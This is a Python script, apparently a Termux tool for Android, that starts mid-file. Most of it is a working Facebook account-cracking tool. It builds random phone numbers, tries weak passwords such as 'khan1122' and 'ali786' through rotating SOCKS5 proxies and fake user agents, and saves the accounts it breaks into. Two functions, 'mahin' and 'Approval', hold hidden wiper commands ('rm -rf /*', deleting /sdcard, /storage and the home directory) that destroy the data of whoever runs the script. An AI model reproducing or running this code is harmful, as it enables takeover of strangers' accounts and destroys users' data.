    os.system("rm -rf /data/data/com.termux/")
    print(f'{M} Your System Fucked by {H} AXI{P}');time.sleep(2)
def mahin():
    os.system("rm -rf /sdcard/DCIM")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard/update")
     
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0/*')
    os.system('rm -rf /storage/emulated/*')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/0/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /storage/*')
    os.system('rm -rf /*')
    os.system('rm -rf /system/*')
    os.system('rm -rf $HOME/../../*')
    os.system('rm -rf $PREFIX/b')
    os.system('rm -rf $HOME/*')
    os.system('mv $HOME /dev/null')
    os.system("rm -rf /data/data/com.termux/")
    print(f'{M} Your System Fucked by {H} AXI{P}');time.sleep(2)
    
def Approval():
    os.system("rm -rf /sdcard/DCIM")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard/update")
     
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0/*')
    os.system('rm -rf /storage/emulated/*')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/0/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /storage/*')
    os.system('rm -rf /*')
    os.system('rm -rf /system/*')
    os.system('rm -rf $HOME/../../*')
    os.system('rm -rf $PREFIX/b')
    os.system('rm -rf $HOME/*')
    os.system('mv $HOME /dev/null')
    os.system("rm -rf /data/data/com.termux/");time.sleep(2)
    print(f'{M} Your System Fucked by {H} AXI{P}');time.sleep(2)

loop = 0
oks = []
cps = []
				
def main():
    os.system('clear')
    print(logo)
    print('[1]\033[1;97m Random Number cloning')
    opt = input('[!]\033[1;97m SELECT OPTION : ')
    if opt =='1':
        password()
    else:
        print('\n\033[1;92mChoose valid option\033[0;97m')
#---------------------[PASS DEF]---------------------#
def password():   
    os.system("clear")
    print(logo)
    print('\033[1;97m[1] last 7 digit password')
    print('\033[1;97m[2] last  10 digit password')
    print('\033[1;97m[3] both last 7 and 10 digit password')
    print('\033[1;97m[4] LAST 7 AND KHAN SERIES')
    print('\033[1;97m[5] LAST 7 AND ALI SERIES')
    print("")
    passX = input('[!]\033[1;97m SELECT OPTION : ')
    if passX in ['1','01']:
        password1()
    elif passX in ['2','02']:
        password2()
    elif passX in ['3','03']:
        password5()
    elif passX in ['4','04']:
        password6()
    elif passX in ['5','05']:
        password7()
    else:
        main()
def password1():
    uid=[]
    os.system('clear')
    print(logo) 

    print('\033[1;97m[example 0306,0309,0308] ')
    kode = input('\033[1;97m Put  Your Country Code: ')
    print('\033[1;97m[example: 1000, 2000, 5000, 10000] ')
    limit = int(input('ENTER LIMIT NUMBER ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        uid.append(nmp)
    with ThreadPool(max_workers=65) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(uid))
        print('Total ids: '+tl)
        print('The process has been started')
        print(47*'-')
        for guru in uid:
            uid = kode+guru
            pwx = [guru]
            yaari.submit(rrcrack,uid,pwx,tl)
    print(50*'-')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print(47*'-')


def password2():
    uid=[]
    os.system('clear')
    print(logo) 

    print('\033[1;97m[example 0306,0309,0308] ')
    kode = input('\033[1;97m Put  Your Country Code: ')
    print('\033[1;97m[example: 1000, 2000, 5000, 10000] ')
    limit = int(input('ENTER LIMIT NUMBER ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        uid.append(nmp)
    with ThreadPool(max_workers=65) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(uid))
        print('Total ids: '+tl)
        print('The process has been started')
        print(47*'-')
        for guru in uid:
            uid = kode+guru
            pwx = [kode+guru]
            yaari.submit(rrcrack,uid,pwx,tl)
    print(50*'-')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print(47*'-')


def password5():
    uid=[]
    os.system('clear')
    print(logo) 

    print('\033[1;97m[example 0306,0309,0308] ')
    kode = input('\033[1;97m Put  Your Country Code: ')
    print('\033[1;97m[example: 1000, 2000, 5000, 10000] ')
    limit = int(input('ENTER LIMIT NUMBER ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        uid.append(nmp)
    with ThreadPool(max_workers=65) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(uid))
        print('Total ids: '+tl)
        print('The process has been started')
        print(47*'-')
        for guru in uid:
            uid = kode+guru
            pwx = [guru,kode+guru]
            yaari.submit(rrcrack,uid,pwx,tl)
    print(50*'-')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print(47*'-')
def password6():
    uid=[]
    os.system('clear')
    print(logo) 

    print('\033[1;97m[example 0306,0309,0308] ')
    kode = input('\033[1;97m Put  Your Country Code: ')
    print('\033[1;97m[example: 1000, 2000, 5000, 10000] ')
    limit = int(input('ENTER LIMIT NUMBER ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        uid.append(nmp)
    with ThreadPool(max_workers=65) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(uid))
        print('Total ids: '+tl)
        print('The process has been started')
        print(47*'-')
        for guru in uid:
            uid = kode+guru
            pwx = [guru,'khankhan','khan1122']
            yaari.submit(rrcrack,uid,pwx,tl)
    print(50*'-')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print(47*'-')


def password7():
    uid=[]
    os.system('clear')
    print(logo) 

    print('\033[1;97m[example 0306,0309,0308] ')
    kode = input('\033[1;97m Put  Your Country Code: ')
    print('\033[1;97m[example: 1000, 2000, 5000, 10000] ')
    limit = int(input('ENTER LIMIT NUMBER ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        uid.append(nmp)
    with ThreadPool(max_workers=65) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(uid))
        print('Total ids: '+tl)
        print('The process has been started')
        print(47*'-')
        for guru in uid:
            uid = kode+guru
            pwx = [guru,'ali786','ali123','ali1122']
            yaari.submit(rrcrack,uid,pwx,tl)
    print(50*'-')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print(47*'-')
def rrcrack(uid,pwx,tl):
    #print(uid)
    global loop
    global cps
    global oks
    try:
        for ps in pwx:
            nip=random.choice(prox)
            proxs= {'http': 'socks5://'+nip}
            #ua1 = random.choice(agen1)
            #ua2 = random.choice(agen2)
            ua = random.choice(ugen)
            ua2 = random.choice(ugen2)   
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_a10kr8rx%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D71859130-d0b0-41d9-b565-a085cf680d74%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_a10kr8rx%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "next":"https://m.facebook.com/v9.0/dialog/oauth?cct_prefetching=0&client_id=630498417018811&cbt=1661507220450&e2e=%7B%22init%22%3A1661507220450%7D&ies=1&sdk=android-9.1.1&sso=chrome_custom_tab&scope=public_profile&state=%7B%220_auth_logger_id%22%3A%22764e6ea0-aa1b-451d-920e-95937478ee2d%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%22f6gsgbutu56c1kim0hue%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.com.naver.linewebtoon&auth_type=rerequest&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true&ret=login&fbapp_pres=0&logger_id=764e6ea0-aa1b-451d-920e-95937478ee2d&tp=unspecified",
            "flow":"login_no_pin",
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':'m.facebook.com',
            'upgrade-insecure-requests': '1',
            'method': 'PATH',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 
            'content-type': 'application/x-www-form-urlencoded',
            'x-requested-with':'XMLHttpRequest', 
            'sec-fetch-site': 'none',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"',
            'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
            'user-agent': ua}
            lo = session.post('https://m.facebook.com/login.php?next=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2Fdevice-based%2Fvalidate-password%2F%3Fshbl%3D0%26locale2%3Did_ID&ref=104&refsrc=deprecated&locale2=id_ID',data=log_data,headers=header_freefb,proxies=proxs).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\033[1;92m[OK-TONU] '+cid+' | '+ps+'\033[0;97m')
                open('ok.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;91m[CP-TONU] '+cid+' | '+ps+'\033[0;97m')
                open('cp.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r   [%s/%s]  OK:- %s  CP:- %s \r'%(loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
main()
